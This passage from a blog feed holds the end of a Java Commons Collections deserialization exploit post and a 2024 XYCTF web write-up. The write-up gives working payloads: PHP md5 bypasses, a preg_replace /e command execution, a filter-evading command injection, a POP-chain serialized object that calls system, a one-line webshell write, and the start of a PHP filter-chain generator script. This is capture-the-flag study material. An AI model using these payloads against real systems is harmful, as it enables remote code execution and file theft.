<span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> cons.newInstance(Retention.class,proxymap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filname)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filname);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h2><p><img src="https://s3.bmp.ovh/imgs/2024/02/19/9093cc14105fb07b.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.337.search-card.all.click&vd_source=eeef3f04dd031c42db0f3b02d8f0ff4b">Java反序列化CommonsCollections篇(一) CC1链手写EXP_哔哩哔哩_bilibili</a></p>
<p><a href="https://xz.aliyun.com/t/9873#toc-13">CC链学习-上 - 先知社区 (aliyun.com)</a></p>
<p><a href="http://www.yongsheng.site/2022/01/24/CommonsCollections-1(%E4%B8%8A)/">CommonsCollections-1(上) | Y0ng的博客 (yongsheng.site)</a></p>
<p><a href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">Apache Commons Collections包和简介 | 闪烁之狐 (blinkfox.github.io)</a></p>
<p><a href="http://www.yongsheng.site/2022/01/24/CommonsCollections-1(%E4%B8%8A)/">JAVA安全|Gadget篇：TransformedMap CC1链 (qq.com)</a></p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>2024xyctf</title>
    <url>/2024/05/10/2024xyctf/</url>
    <content><![CDATA[<p> 2024xyctf </p>
 <span id="more"></span>

<p>web</p>
<h1 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: xyctf.top:39564</span><br><span class="line">User-Agent: XYCTF</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: yuanshen.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 48</span><br><span class="line">Origin: http://xyctf.top:39564</span><br><span class="line">Connection: close</span><br><span class="line">Client-IP: 127.0.0.1</span><br><span class="line">Via: ymzx.qq.com</span><br><span class="line">Cookie: XYCTF</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username=XYCTF&amp;password=%40JOILha%21wuigqi123%24</span><br></pre></td></tr></table></figure>

<h1 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;next.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$XYCTF</span> = <span class="string">&quot;Warm up&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ez&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$md5</span>) &amp;&amp; <span class="variable">$md5</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ezez&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$XY</span> == <span class="variable">$XYCTF</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$XY</span> != <span class="string">&quot;XYCTF_550102591&quot;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$XY</span>) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;XYCTF_550102591&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;学这么久,传参不会传?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>paylaod:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?val1=s214587387a&amp;val2=s878926199a&amp;md5=0e215962017&amp;XY=0e215962017&amp;XYCTF=0e215962017</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;操作你O.o&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);  <span class="comment">// 我可不会像别人一样设置10来个level</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;有点汗流浃背&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?pat=/zhou/e&amp;b=system(&#x27;ls&#x27;)&amp;c=zhou</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/LLeeevvveeelll222.php?a=/zhou/e&amp;b=system(&#x27;cat /flag&#x27;)&amp;c=zhou</span><br><span class="line">a[]=1</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/qq_53099802/article/details/124952009?ops_request_misc=%7B%22request_id%22:%22171197313416800197022499%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=171197313416800197022499&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-124952009-null-null.142">PHP 5.5.9的 preg_replace()函数漏洞_php preg_replace 禁止 函数 漏洞-CSDN博客</a></p>
<h1 id="牢牢记住，逝者为大"><a href="#牢牢记住，逝者为大" class="headerlink" title="牢牢记住，逝者为大"></a>牢牢记住，逝者为大</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Kobe</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) &gt; <span class="number">13</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;see you again~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;肘死你&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$val_name</span> =&gt; <span class="variable">$val_val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;</span>, <span class="variable">$val_val</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;what can i say&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">Kobe</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span>  . <span class="string">&quot;,manba out&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span> . <span class="string">&quot;,mamba out&quot;</span>);</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0a`$_GET[1]`;%23&amp;1=c$9p+$&#x27;\57&#x27;[e-g][k-m][Z-b][e-h]+2</span><br></pre></td></tr></table></figure>

<p> 写入2 文件 然后访问2 即可</p>
<h1 id="ezPOP"><a href="#ezPOP" class="headerlink" title="ezPOP"></a>ezPOP</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 A &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;s-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 B &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable">$_POST</span>;</span><br><span class="line">        <span class="variable">$c</span>=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="variable">$d</span>=<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 C &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;noooooob!!!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pop</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;xy&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;s=<span class="keyword">new</span> <span class="title function_ invoke__">BBB</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>=<span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="keyword">array</span>(<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$zhou</span>=<span class="keyword">new</span> <span class="title function_ invoke__">CCC</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$zhou</span>);</span><br><span class="line">?xy=O:<span class="number">3</span>:<span class="string">&quot;CCC&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;AAA&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;s&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;BBB&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;&#125;s:<span class="number">1</span>:<span class="string">&quot;d&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;cat /flag&quot;</span>;&#125;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;xy&quot;</span>;&#125;</span><br><span class="line">a=current&amp;zhou=current</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/web1/ezphp.php?xy=O:3:%22CCC%22:1:&#123;s:1:%22c%22;N;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ezmd5"><a href="#ezmd5" class="headerlink" title="ezmd5"></a>ezmd5</h1><p><a href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value">cryptanalysis - Are there two known strings which have the same MD5 hash value? - Cryptography Stack Exchange</a></p>
<p>这 2 张图像具有相同的 md5 哈希值：253dd04e87492e4fc3471de5e776bc3d</p>
<p>将这两个图片传上去即可</p>
<h1 id="ezMake"><a href="#ezMake" class="headerlink" title="ezMake"></a>ezMake</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;&lt;?=system(&quot;cat flag&quot;)?&gt;&#x27; &gt;1.php</span><br></pre></td></tr></table></figure>

<h1 id="连连看到底是连连什么看"><a href="#连连看到底是连连什么看" class="headerlink" title="连连看到底是连连什么看"></a>连连看到底是连连什么看</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;waf!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;php://filter/<span class="subst">$p</span>/resource=/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$payload</span>)===<span class="string">&quot;XYCTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://gitcode.com/synacktiv/php_filter_chain_generator/overview?utm_source=csdn_github_accelerator&isLogin=1">项目首页 - php_filter_chain_generator - GitCode</a></p>
<p>原理介绍</p>
<p><a href="https://xz.aliyun.com/t/12939?time__1311=mqmhqIx+xfOD7DloaGkWDkWAvbx0EfSTD&alichlgref=https://luoingly.top/#toc-0">PHP Filter链——基于oracle的文件读取攻击 - 先知社区 (aliyun.com)</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># - Useful infos -</span></span><br><span class="line"><span class="comment"># https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters</span></span><br><span class="line"><span class="comment"># https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</span></span><br><span class="line"><span class="comment"># https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># No need to guess a valid filename anymore</span></span><br><span class="line">file_to_use = <span class="string">&quot;php://temp&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;E&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;F&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;G&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;H&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>: <span class="string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;I&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;i&#x27;</span>: <span class="string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;J&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;j&#x27;</span>: <span 